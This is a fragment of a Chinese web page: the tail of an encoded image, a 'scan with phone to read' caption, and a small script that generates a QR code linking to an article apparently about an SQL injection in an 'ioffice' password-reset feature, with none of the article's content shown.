x9Dhb9KzfqAaid5tzn8xDaKHGrJn57icsA5mJF//ZE5i+7fU2NDXbiHOuRWshnhjnIWI4/goIBweH7x5C18t/1eDo3fZrY61hDqLOsXIyxyNUXpZzimUQ/eTLIGJg/WJ4+7Gv8pKVJ5n90X7hmCgwkuyv99Dncm9g17UNrMk8hNY5Y9bYb3MQtc6PEHoNBOd+EDFc41mN14fo41hYBqJg2fdPoAwEYlpQY96ip27MOflw1FpjhMhJZ3POsRFCCwfOtK4RWgNR51g5mWMh1BpxMggeUMnQpJONkuJlzsm/MmuFZSAKln3/BL4wkO//0L+8gzKQ2bUC9n94oUfXjH5AqPVn2lH9FQfR332FUHPuoZzM8bMI475nfSBqsgZ6Lufll4EoWPb9E5h+uOit6cmytRzExCHQ+RHCXDPr/1/7uB7ma7ca70XonHyZY7juJ73MNULFMoh6CFTOtm6IT+JHsBsIxNSgR+8ZIqdpZ3N+hNblHEQfCGw1joVQa8TJRv0yl32IHtB/bKNeMjg0uTb70skyZx+ivo0BUwXVQ1aIzekGsnHr+4snMB2IJtea92keqN6BOS+0xiiuNeeMbT7H1kC9JhzxTGM+I0Sd14CIs8Y+RA4CXfMIuofQevkyiH7ybdOBuHjhZ09gDeSz5325WhkIxPVxBdSxeSHUOV+3jFBroI5HfcTJYK7Na2RfvmqziZNB9IMDs06+dDI4NBC++GzSyzLX+so/ahDrAOvvIbcf+7r8iyEc02ufAscQmvyztTnHZxrnrIXoCzhVENjfUBRic6DnNrr8rwzuKxQvky+TPzOo+0LE0KN7QOQcP4rlJevRgqX7uydQPjrRUzKy0fIwnj4EDweO6s1B6NoYgn9kPxBaOH7Zcz8jhMax0L2hzpkXSieTL5Mvky+T3xrU/SBioEiB7nY7uW6IT+JHsAwEYmpQ42ifejpkzsmXORYqlsm/MulGBvVegNJqpC/JiQPsTyZQFO4DlByEbxHUsfmM7pO5mX+mLQOZFS/+sydQ3mV5asazbUA8MRA40kKdgzrONTDPZZ18CC3MUbps/pky5rx85+TPDGLNUR7mOevhWrNuiE/rR3AN5HQQn0+Wt73t0r7CGa3JnHy4vorSySC08Nrb1Nke1NtmzRnCsQ+gSN1DaFJ+NvMZcz77I03mWn/dkPZEvhyXf9SB7m0fnHPeu58Ix8+i6yHWG9XDOAfBA10ZMP2ZvKbRxXDUOAfBtRrHGaHWjnIQGvfPmnVD8mn8gF8G4mk9gu2+ISaeeffJnHzzQqjrxMmke9Skt13VWCe0FsZ7kAbqnGvOUHWykUZ8Nuj7l4GMGizu8yfQDQRiatDj39oexFpt//w02bcGogZ6tKZFuNbCoXG914bIOXZeCJGDGpWzQeQcG91P2A3EooXfOYE1kO+c+3TVtwxEV002XeUioVoZjK+0yiFy0mVTzpZ5+TN+lHtF65qM6i0zJ99mzmge4mcD1t/Ubz/29ZYbAjFhT1zon1O+DEJjPiNETjqZcxA89B+zQOSkt7V1jo0QNTDvB4emrZvF5kcIfb+RztxbBuJmC//7CXQD8dM2wtly1kL/NEBwZxrnZv3FQ/SRf2XuZ7TesdDcIyi9DB7fw6ivesicg+gnztYNxOKF3zmBMhCIacE1PrJViD6PaK2BusZPTUaoNRAx4DblA8VCDByg6ICBoqfyPlq/VTvf8qMYKHspAxkJF/f5E1gD+fyZn674LwAAAP//ihq5LwAAAAZJREFUAwDJyFetfwYZ3AAAAABJRU5ErkJggg==)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/ioffice-ClearPwd-mrClearPwd-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 